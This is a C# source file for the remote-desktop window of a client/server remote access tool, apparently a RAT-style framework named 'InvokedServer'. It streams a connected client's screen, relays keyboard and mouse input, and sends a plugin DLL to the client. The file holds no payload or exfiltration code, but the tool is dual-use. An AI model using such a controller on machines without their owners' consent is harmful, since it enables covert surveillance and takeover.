

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;
using Guna.UI2.WinForms;
using InvokedCommon.Enums;
using InvokedCommon.Helpers;
using InvokedCommon.Messages;
using InvokedServer.Enums;
using InvokedServer.Helper;
using InvokedServer.Messages;
using InvokedServer.Networking;
using InvokedServer.Properties;
using InvokedServer.Utilities;


namespace InvokedServer.Forms
{
	public partial class FrmRemoteDesktop : Form
	{
		private bool DidLoadPlugin;
		private bool _enableMouseInput;
		private bool _enableMouseMovement;
		private bool _enableKeyboardInput;
		private IKeyboardMouseEvents _keyboardHook;
		private IKeyboardMouseEvents _mouseHook;
		private readonly List<Keys> _keysPressed;
		private readonly Client _connectClient;
		private readonly RemoteDesktopHandler _remoteDesktopHandler;
		private static readonly Dictionary<Client, FrmRemoteDesktop> OpenedForms = new Dictionary<Client, FrmRemoteDesktop>();
		public static bool _oldGraphicsEngine = false;
		public static bool _showCursor = true;

		public static FrmRemoteDesktop CreateNewOrGetExisting(Client client)
		{
			if (FrmRemoteDesktop.OpenedForms.ContainsKey(client))
				return FrmRemoteDesktop.OpenedForms[client];
			FrmRemoteDesktop newOrGetExisting = new FrmRemoteDesktop(client);
			newOrGetExisting.Disposed += (EventHandler)((sender, args) => FrmRemoteDesktop.OpenedForms.Remove(client));
			FrmRemoteDesktop.OpenedForms.Add(client, newOrGetExisting);
			return newOrGetExisting;
		}

		public FrmRemoteDesktop(Client client)
		{
			this._connectClient = client;
			this._remoteDesktopHandler = new RemoteDesktopHandler(client);
			this._keysPressed = new List<Keys>();
			this.RegisterMessageHandler();
			this.InitializeComponent();
		}

		private void ClientDisconnected(Client client, bool connected)
		{
			if (connected)
				return;
			this.Text = WindowHelper.GetWindowTitle("Remote Desktop", this._connectClient) + " *Client Disconnected*";
			this.btnStart.Enabled = false;
			this.btnStop.Enabled = false;
		}

		private void RegisterMessageHandler()
		{
			this._connectClient.ClientState += new Client.ClientStateEventHandler(this.ClientDisconnected);
			this._remoteDesktopHandler.DisplaysChanged += new RemoteDesktopHandler.DisplaysChangedEventHandler(this.DisplaysChanged);
			this._remoteDesktopHandler.ProgressChanged += new MessageProcessorBase<Bitmap>.ReportProgressEventHandler(this.UpdateImage);
			this._remoteDesktopHandler.NewImageSizeUpdate += new RemoteDesktopHandler.MessegeSizeHandler(this.UpdateSizeLabel);
			this._remoteDesktopHandler.PluginStatusChanged += new RemoteDesktopHandler.PluginStatusEventHandler(this.PluginStatusChanged);
			MessageHandler.Register((IMessageProcessor)this._remoteDesktopHandler);
		}

		private void UnregisterMessageHandler()
		{
			MessageHandler.Unregister((IMessageProcessor)this._remoteDesktopHandler);
			this._remoteDesktopHandler.DisplaysChanged -= new RemoteDesktopHandler.DisplaysChangedEventHandler(this.DisplaysChanged);
			this._remoteDesktopHandler.ProgressChanged -= new MessageProcessorBase<Bitmap>.ReportProgressEventHandler(this.UpdateImage);
			this._remoteDesktopHandler.PluginStatusChanged -= new RemoteDesktopHandler.PluginStatusEventHandler(this.PluginStatusChanged);
			this._connectClient.ClientState -= new Client.ClientStateEventHandler(this.ClientDisconnected);
		}

		private void SubscribeEvents()
		{
			if (PlatformHelper.RunningOnMono)
			{
				this.KeyDown += new KeyEventHandler(this.OnKeyDown);
				this.KeyUp += new KeyEventHandler(this.OnKeyUp);
			}
			else
			{
				this._keyboardHook = Hook.GlobalEvents();
				this._keyboardHook.KeyDown += new KeyEventHandler(this.OnKeyDown);
				this._keyboardHook.KeyUp += new KeyEventHandler(this.OnKeyUp);
				this._mouseHook = Hook.AppEvents();
				this._mouseHook.MouseWheel += new MouseEventHandler(this.OnMouseWheelMove);
			}
		}

		private void UnsubscribeEvents()
		{
			if (PlatformHelper.RunningOnMono)
			{
				this.KeyDown -= new KeyEventHandler(this.OnKeyDown);
				this.KeyUp -= new KeyEventHandler(this.OnKeyUp);
			}
			else
			{
				if (this._keyboardHook != null)
				{
					this._keyboardHook.KeyDown -= new KeyEventHandler(this.OnKeyDown);
					this._keyboardHook.KeyUp -= new KeyEventHandler(this.OnKeyUp);
					this._keyboardHook.Dispose();
				}
				if (this._mouseHook == null)
					return;
				this._mouseHook.MouseWheel -= new MouseEventHandler(this.OnMouseWheelMove);
				this._mouseHook.Dispose();
			}
		}

		private void StartStream()
		{
			this.ToggleConfigurationControls(true);
			this.picDesktop.Start();
			this.picDesktop.SetFrameUpdatedEvent(new FrameUpdatedEventHandler(this.frameCounter_FrameUpdated));
			this.ActiveControl = (Control)this.picDesktop;
			this._remoteDesktopHandler.BeginReceiveFrames(this.barQuality.Value, this.cbMonitors.SelectedIndex, FrmRemoteDesktop._showCursor);
		}

		private void StopStream()
		{
			this.ToggleConfigurationControls(false);
			this.picDesktop.Stop();
			this.picDesktop.UnsetFrameUpdatedEvent(new FrameUpdatedEventHandler(this.frameCounter_FrameUpdated));
			this.ActiveControl = (Control)this.picDesktop;
			this._remoteDesktopHandler.EndReceiveFrames();
		}

		private void ToggleConfigurationControls(bool started)
		{
			this.btnStart.Enabled = !started;
			this.btnStop.Enabled = started;
			this.barQuality.Enabled = !started;
			this.cbMonitors.Enabled = !started;
			this.ShowCursorBtn.Enabled = !started;
		}

		private void TogglePanelVisibility(bool visible)
		{
			this.panelTop.Visible = visible;
			this.btnShow.Visible = !visible;
			this.ActiveControl = (Control)this.picDesktop;
			this.OnResize(EventArgs.Empty);
		}

		private void DisplaysChanged(object sender, int displays)
		{
			this.cbMonitors.Items.Clear();
			for (int index = 0; index < displays; ++index)
				this.cbMonitors.Items.Add((object)string.Format("Display {0}", (object)(index + 1)));
			this.cbMonitors.SelectedIndex = 0;
		}

		public void UpdateSizeLabel(object sender, string sizeText)
		{
			this.SizeLabel.Text = "Size: " + sizeText;
		}

		private void PluginStatusChanged(object sender, PluginStatus status)
		{
			switch (status)
			{
				case PluginStatus.Loaded:
					this.PluginLabel.ForeColor = Color.LightGreen;
					this.PluginLabel.Text = "Plugin is ready!";
					if (!this.DidLoadPlugin)
					{
						this.PluginLabel.Visible = false;
						break;
					}
					break;
				case PluginStatus.Installing:
					this.PluginLabel.ForeColor = Color.DeepSkyBlue;
					this.PluginLabel.Text = "Sending the Plugin for the first time, please wait..";
					this.DidLoadPlugin = true;
					break;
				case PluginStatus.PluginFileNotFound:
					this.PluginLabel.ForeColor = Color.Red;
					this.PluginLabel.Text = "Error: Cannot find the Plugin dll in Plugins folder!";
					break;
			}
			this.OnResize(EventArgs.Empty);
		}

		private void UpdateImage(object sender, Bitmap bmp) => this.picDesktop.UpdateImage(bmp, false);

		private void FrmRemoteDesktop_Load(object sender, EventArgs e)
		{
			this._remoteDesktopHandler.LocalResolution = this.picDesktop.Size;
			this.Text = WindowHelper.GetWindowTitle("Remote Desktop", this._connectClient);
			this.OnResize(EventArgs.Empty);
			this._remoteDesktopHandler.CheckPluginStatus();
		}

		private void frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
		{
			this.Text = string.Format("{0} - FPS: {1}", (object)WindowHelper.GetWindowTitle("Remote Desktop", this._connectClient), (object)e.CurrentFramesPerSecond.ToString("0.00"));
		}

		private void FrmRemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.UnsubscribeEvents();
			if (this._remoteDesktopHandler.IsStarted)
				this.StopStream();
			this.UnregisterMessageHandler();
			this._remoteDesktopHandler.Dispose();
			this.picDesktop.Image?.Dispose();
		}

		private void FrmRemoteDesktop_Resize(object sender, EventArgs e)
		{
			if (this.WindowState == FormWindowState.Minimized)
				return;
			this._remoteDesktopHandler.LocalResolution = this.picDesktop.Size;
			this.btnShow.Left = (this.Width - this.btnShow.Width) / 2;
			this.PluginLabel.Left = (this.Width - this.PluginLabel.Width) / 2;
			if (this.btnExit.Visible)
			{
				if (this.btnShow.Visible)
				{
					this.btnExit.Top = this.panelTop.Top;
					this.btnShow.Left = (this.Width - this.btnShow.Width - this.btnShow.Width) / 2;
					this.btnExit.Left = this.btnShow.Left + this.btnShow.Width + 3;
				}
				else
				{
					this.btnExit.Top = this.panelTop.Bottom;
					this.btnExit.Left = (this.Width - this.btnExit.Width) / 2;
				}
				this.ActiveControl = (Control)this.btnExit;
			}
			int num = 166;
			this.cbMonitors.Width = this.ClientSize.Width - 321 - num;
			this.cbMonitors.Left = num;
		}

		private void btnStart_Click(object sender, EventArgs e)
		{
			if (this.cbMonitors.Items.Count == 0)
			{
				int num = (int)MessageBox.Show("No remote display detected.\nPlease wait till the client sends a list with available displays.", "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			else
			{
				this.PluginLabel.Visible = false;
				this._remoteDesktopHandler.LocalResolution = this.picDesktop.Size;
				this.SubscribeEvents();
				this.StartStream();
			}
		}

		private void btnStop_Click(object sender, EventArgs e)
		{
			this.UnsubscribeEvents();
			this.StopStream();
		}

		private void picDesktop_MouseDown(object sender, MouseEventArgs e)
		{
			if (this.picDesktop.Image == null || !this._enableMouseInput || !this.ContainsFocus)
				return;
			MouseAction mouseAction = MouseAction.None;
			if (e.Button == MouseButtons.Left)
				mouseAction = MouseAction.LeftDown;
			if (e.Button == MouseButtons.Right)
				mouseAction = MouseAction.RightDown;
			int selectedIndex = this.cbMonitors.SelectedIndex;
			if (!this._enableMouseMovement)
				this._remoteDesktopHandler.SendMouseEvent(MouseAction.MoveCursor, false, e.X, e.Y, selectedIndex);
			this._remoteDesktopHandler.SendMouseEvent(mouseAction, true, e.X, e.Y, selectedIndex);
		}

		private void picDesktop_MouseUp(object sender, MouseEventArgs e)
		{
			if (this.picDesktop.Image == null || !this._enableMouseInput || !this.ContainsFocus)
				return;
			MouseAction mouseAction = MouseAction.None;
			if (e.Button == MouseButtons.Left)
				mouseAction = MouseAction.LeftUp;
			if (e.Button == MouseButtons.Right)
				mouseAction = MouseAction.RightUp;
			int selectedIndex = this.cbMonitors.SelectedIndex;
			if (!this._enableMouseMovement)
				this._remoteDesktopHandler.SendMouseEvent(MouseAction.MoveCursor, false, e.X, e.Y, selectedIndex);
			this._remoteDesktopHandler.SendMouseEvent(mouseAction, false, e.X, e.Y, selectedIndex);
		}

		private void picDesktop_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.picDesktop.Image == null || !this._enableMouseInput || !this._enableMouseMovement || !this.ContainsFocus)
				return;
			int selectedIndex = this.cbMonitors.SelectedIndex;
			this._remoteDesktopHandler.SendMouseEvent(MouseAction.MoveCursor, false, e.X, e.Y, selectedIndex);
		}

		private void OnMouseWheelMove(object sender, MouseEventArgs e)
		{
			if (this.picDesktop.Image == null || !this._enableMouseInput || !this.ContainsFocus)
				return;
			this._remoteDesktopHandler.SendMouseEvent(e.Delta == 120 ? MouseAction.ScrollUp : MouseAction.ScrollDown, false, 0, 0, this.cbMonitors.SelectedIndex);
		}

		private void OnKeyDown(object sender, KeyEventArgs e)
		{
			if (this.picDesktop.Image == null || !this._enableKeyboardInput || !this.ContainsFocus)
				return;
			if (!this.IsLockKey(e.KeyCode))
				e.Handled = true;
			if (this._keysPressed.Contains(e.KeyCode))
				return;
			this._keysPressed.Add(e.KeyCode);
			this._remoteDesktopHandler.SendKeyboardEvent((byte)e.KeyCode, true);
		}

		private void OnKeyUp(object sender, KeyEventArgs e)
		{
			if (this.picDesktop.Image == null || !this._enableKeyboardInput || !this.ContainsFocus)
				return;
			if (!this.IsLockKey(e.KeyCode))
				e.Handled = true;
			this._keysPressed.Remove(e.KeyCode);
			this._remoteDesktopHandler.SendKeyboardEvent((byte)e.KeyCode, false);
		}

		private bool IsLockKey(Keys key)
		{
			return (key & Keys.Capital) == Keys.Capital || (key & Keys.NumLock) == Keys.NumLock || (key & Keys.Scroll) == Keys.Scroll;
		}

		private void barQuality_Scroll(object sender, EventArgs e)
		{
			int num = this.barQuality.Value;
			this.lblQualityShow.Text = num.ToString();
			if (num < 25)
				this.lblQualityShow.Text += " (low)";
			else if (num >= 85)
				this.lblQualityShow.Text += " (best)";
			else if (num >= 75)
				this.lblQualityShow.Text += " (high)";
			else if (num >= 25)
				this.lblQualityShow.Text += " (mid)";
			this.ActiveControl = (Control)this.picDesktop;
		}

		private void btnMouse_Click(object sender, EventArgs e)
		{
			if (this._enableMouseInput)
			{
				this.picDesktop.Cursor = Cursors.Default;
				this.btnMouse.Image = (Image)Resources.mouse_delete;
				this.toolTipButtons.SetToolTip((Control)this.btnMouse, "Enable mouse input.");
				this._enableMouseInput = false;
				this.BtnMouseMovement.Enabled = false;
			}
			else
			{
				this.picDesktop.Cursor = Cursors.Hand;
				this.btnMouse.Image = (Image)Resources.mouse_add;
				this.toolTipButtons.SetToolTip((Control)this.btnMouse, "Disable mouse input.");
				this._enableMouseInput = true;
				this.BtnMouseMovement.Enabled = true;
			}
			this.ActiveControl = (Control)this.picDesktop;
		}

		private void btnKeyboard_Click(object sender, EventArgs e)
		{
			if (this._enableKeyboardInput)
			{
				this.picDesktop.Cursor = Cursors.Default;
				this.btnKeyboard.Image = (Image)Resources.keyboard_delete;
				this.toolTipButtons.SetToolTip((Control)this.btnKeyboard, "Enable keyboard input.");
				this._enableKeyboardInput = false;
			}
			else
			{
				this.picDesktop.Cursor = Cursors.Hand;
				this.btnKeyboard.Image = (Image)Resources.keyboard_add;
				this.toolTipButtons.SetToolTip((Control)this.btnKeyboard, "Disable keyboard input.");
				this._enableKeyboardInput = true;
			}
			this.ActiveControl = (Control)this.picDesktop;
		}

		private void btnShow_Click(object sender, EventArgs e) => this.TogglePanelVisibility(true);

		private void BtnMouseMovement_Click(object sender, EventArgs e)
		{
			if (this._enableMouseMovement)
			{
				this.BtnMouseMovement.Image = (Image)Resources.MouseDisableMovement;
				this.toolTipButtons.SetToolTip((Control)this.btnMouse, "Disable mouse Movement.");
				this._enableMouseMovement = false;
			}
			else
			{
				this.BtnMouseMovement.Image = (Image)Resources.MouseEnableMovement;
				this.toolTipButtons.SetToolTip((Control)this.btnMouse, "Enable mouse Movement.");
				this._enableMouseMovement = true;
			}
			this.ActiveControl = (Control)this.picDesktop;
		}

		private void RDExtra_Click(object sender, EventArgs e)
		{
			Guna2GradientButton guna2GradientButton = (Guna2GradientButton)sender;
			Point p = new Point(0, guna2GradientButton.Height);
			this.RDcontextMenuStrip.Show(guna2GradientButton.PointToScreen(p));
		}

		private void ShowCursorBtn_Click(object sender, EventArgs e)
		{
			FrmRemoteDesktop._showCursor = this.ShowCursorBtn.Checked;
		}

		private void fullScreenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.btnExit.Visible = true;
			this.FormBorderStyle = FormBorderStyle.None;
			this.WindowState = FormWindowState.Normal;
			this.WindowState = FormWindowState.Maximized;
		}

		private void hideToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.TogglePanelVisibility(false);
		}

		private void btnExit_Click(object sender, EventArgs e)
		{
			this.FormBorderStyle = FormBorderStyle.Sizable;
			this.WindowState = FormWindowState.Normal;
			this.btnExit.Visible = false;
		}

		private void CapFPSToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.picDesktop.CapFPS = this.CapFPSToolStripMenuItem.Checked;
		}

		private void OldGraphicsEngineToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._remoteDesktopHandler.SetOldGraphicsEngine(this.OldGraphicsEngineToolStripMenuItem.Checked);
		}
	}
}